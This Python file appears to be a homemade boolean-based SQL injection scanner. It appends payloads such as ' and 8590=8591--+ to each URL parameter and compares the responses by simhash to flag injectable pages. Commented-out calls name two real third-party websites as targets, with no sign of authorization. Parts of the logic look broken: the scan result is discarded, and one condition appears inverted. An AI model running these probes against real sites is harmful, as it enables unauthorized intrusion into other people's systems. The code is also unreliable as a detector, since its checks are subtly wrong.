from sqlinjection import get_html
import urllib.parse as urlparse
from changanya.simhash import Simhash

def is_similar_page(res1, res2, radio):
    '''
    计算页面相似度函数
    '''
    if res1 is None or res2 is None:
        return False
    # body1 = res1.text
    # body2 = res2.text

    simhash1 = Simhash(str(res1))
    simhash2 = Simhash(str(res2))

    calc_radio = simhash1.similarity(simhash2)
    print("两个页面的相似度为:%s" % (calc_radio))
    if calc_radio >= radio and calc_radio<0.99:
        return True
    else:
        return False

def bool_in(domain,queries,old_html):
    payloads= (" and 8590=8591--+","' and 8590=8591--+",'''" and 8590=8591--+''',") and 8590=8591--+","') and 8590=8591--+",'''") and 8590=8591--+''')
    for payload in payloads:
        website = domain + "?" + ("&".join([param + payload for param in queries]))
        # print(website)
        source = get_html.gethtml(website)
        if source and is_similar_page(source,old_html,radio=0.3):
            return True,"unknown"
    return False,None

def injection_control(url):
    old_html=get_html.gethtml(url)
    domain = url.split("?")[0]
    #获取域名和参数，用来构建payload
    queries = urlparse.urlparse(url).query.split("&")
    if old_html or not any(queries):
        bool_in(domain,queries,old_html)

# injection_control("https://www.ewant.org/local/school/singlelist.php?id=90")
# injection_control("http://www.titanfine.com/about.php?id=4")